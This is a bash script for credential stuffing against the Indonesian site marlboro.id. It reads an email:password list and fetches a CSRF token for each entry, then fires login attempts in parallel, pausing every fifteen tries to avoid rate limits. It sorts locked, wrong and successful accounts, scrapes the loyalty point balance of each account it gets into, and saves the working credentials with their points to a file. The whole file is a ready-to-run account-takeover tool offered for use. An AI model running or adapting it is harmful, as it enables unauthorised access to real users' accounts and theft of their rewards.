# cok='.txt'
login(){
	ceklogin=$(curl -s -X POST --compressed \
	--url 'https://www.marlboro.id/auth/login?ref_uri=/profile'\
	-H 'Accept-Language: en-US,en;q=0.9' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
	-H 'Host: www.marlboro.id' \
	-H 'Origin: https://www.marlboro.id' \
	-H 'Referer: https://www.marlboro.id/' \
	-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36' \
	-H 'X-Requested-With: XMLHttpRequest' \
	--data-urlencode 'email='$1'' \
	--data-urlencode 'password='$2''\
	--data-urlencode 'decide_csrf='$3'' \
	--data-urlencode 'ref_uri=%252Fprofile0' \
	--cookie-jar $4 -b $4 | grep -Po "(?<=\"message\":\").*?(?=\")")
	if [[ "$ceklogin" =~ 'Akun lo telah dikunci' ]]; then
		echo "Akun Dikunci (locked)"
		# continue
	elif [[ "$ceklogin" =~ 'Email atau password yang lo masukan salah' ]]; then
		echo -n "Wrong Password"
	elif [[ "$ceklogin" =~ 'success' ]]; then
		point=$(curl -s 'https://www.marlboro.id/profile' -b $4 -c $4 | grep -Po "(?<=<img src=\"/assets/images/icon-point.svg\"/><div>).*?(?=</div></div>)")
		echo "$1 | $point"
		echo "[${i}] $point | ${1}:${2}" >> cek.txt
	else
		echo -n "Wrong CSRF | $ceklogin"
	fi
		rm $4
}
read -p 'Your Email List File: ' list
y=$(gawk -F: '{ print $1 }' $list)
x=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($y)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'passw=($x)'
for (( i = 0; i < "${#email[@]}"; i++ )); do
	emails="${email[$i]}"
	cok="${emails}-check.txt"
	decide_csrf=$(curl -s 'https://www.marlboro.id/auth/login?ref_uri=/profile' --cookie-jar $cok | grep -Po "(?<=name\=\"decide_csrf\" value\=\").*?(?=\" />)" | head -1)
	pw="${passw[$i]}"
	tahan=$(expr $i % 15)
	if [[ "$tahan" == 0 ]]; then
		echo "sleeping"
		sleep 5
	fi
	login $emails $pw $decide_csrf $cok &
done
wait
